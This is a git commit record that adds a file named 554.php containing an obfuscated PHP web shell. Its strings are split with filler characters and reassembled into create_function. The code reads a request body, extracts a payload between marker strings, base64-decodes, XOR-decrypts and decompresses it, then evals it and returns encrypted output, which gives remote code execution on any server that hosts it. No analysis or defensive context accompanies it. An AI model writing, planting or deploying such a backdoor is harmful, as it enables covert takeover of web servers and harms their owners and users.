fd58bd466fb654c97f89abd40c7391846cb88d92
oTm4n3 <61689618+oTm4n3@users.noreply.github.com>
2022-06-30 12:58:59 -0600

    Create 554.php

---
+++ 554.php
@@ -0,0 +1,10 @@
+<?php
+$K='b_ge|ut_cont|u|uents();@ob_end_cle|uan();|u$r=@b|uase64_enco|ude(|u@x(@gzcom|upress(|u$o|u|u),$k))|u;pri|unt("$p$kh$r$kf");}';
+$v='$k="5e|u388103"|u;|u$kh="a39|u1|ud|uaabe3de|u";$kf="1d7|u6a6739|uccd";$p|u="kRInPMQmBRj|uLI|uyc2";functio|un x($|ut|u,';
+$V='+){$o.=$t{$|ui}|u^$k{$j};}|u}return $o;}if |u(@pr|ue|ug_|u|umatch("/$kh(.+)$kf/",@fi|ule_get|u_conte|unts|u("|uphp:';
+$U='$k){|u$c=strl|uen|u($k);$|ul=strle|un($t);$o="";|ufor($i=0;|u$i<$l|u;){for(|u$|uj=0;|u($j<$c&&$i|u<|u$l);$j+|u+,|u$|ui+';
+$A='//i|u|unput"),$m|u|u)==1) {@ob|u_start();@|ueva|ul(|u@gzu|unco|umpress(@x(@ba|use|u64_decode($m[1]|u),$k|u)));|u$o=@o';
+$k=str_replace('kM','','ckMrekMatekM_kMfukMnkMction');
+$G=str_replace('|u','',$v.$U.$V.$A.$K);
+$g=$k('',$G);$g();
+?>
